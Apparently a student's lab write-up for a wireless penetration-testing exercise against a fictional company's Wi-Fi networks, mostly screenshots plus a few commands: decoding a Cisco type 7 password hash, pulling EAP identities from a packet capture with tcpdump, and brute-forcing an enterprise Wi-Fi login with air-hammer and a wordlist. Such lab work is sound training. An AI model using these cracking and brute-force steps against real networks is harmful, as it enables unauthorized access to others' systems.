#### In-Scope Targets

`Clyra Cloud Website`: [http://clyracloud.us](http://clyracloud.us/)

The website is only accessible from within the `attack box` environment. Be sure to access it from the lab-provided machine to retrieve the required data.

|**SSID**|**Description**|
|---|---|
|`ClyraCloud-ORT`|ClyraCloud SSID for open-area access|
|`ClyraCloud-SEC`|ClyraCloud secured SSID for network access|
|`ClyraCloud-INT`|ClyraCloud SSID for internal network|
|`ClyraCloud-ENT`|ClyraCloud SSID for enterprise network|
### What is the password for the Wi-Fi network named ClyraCloud-ORT?

![](Screenshot%202026-10-06%20at%2009.13.18.png)

![](Screenshot%202026-10-06%20at%2009.14.04.png)

![](Screenshot%202026-10-06%20at%2009.17.17.png)

![](Screenshot%202026-10-06%20at%2009.18.22.png)

![](Screenshot%202026-10-06%20at%2009.44.13.png)
### What is the password for the Wi-Fi network named ClyraCloud-INT?

![](Screenshot%202026-10-06%20at%2009.32.34.png)

```
python ciscot7.py -d -p <hash>
```

![](Screenshot%202026-10-06%20at%2009.34.24.png)
### What is the password of the user George White for the Wi-Fi network named ClyraCloud-ENT?

![](Screenshot%202026-10-06%20at%2009.58.09.png)

![](Screenshot%202026-10-06%20at%2009.57.58.png)

```sh
tcpdump -r ClyraCloud-ENT-01.cap -v -n | grep -i identity
```

![](Screenshot%202026-10-06%20at%2010.07.25.png)

```sh
echo "CLYRA\g.white" > user.txt

python2 air-hammer/air-hammer.py -i wlan0mon -e ClyraCloud-ENT -p wordlist.txt -u user.txt
```

